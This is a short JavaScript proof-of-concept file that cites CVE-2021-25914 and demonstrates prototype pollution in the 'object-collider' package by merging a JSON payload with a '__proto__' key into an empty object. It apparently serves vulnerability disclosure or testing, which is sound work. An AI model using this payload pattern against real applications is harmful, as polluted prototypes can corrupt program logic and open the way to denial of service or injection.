//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25914

 
  var { collide } = require("object-collider");
  const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  obj = {};

   

  collide(obj, payload);
// End of file
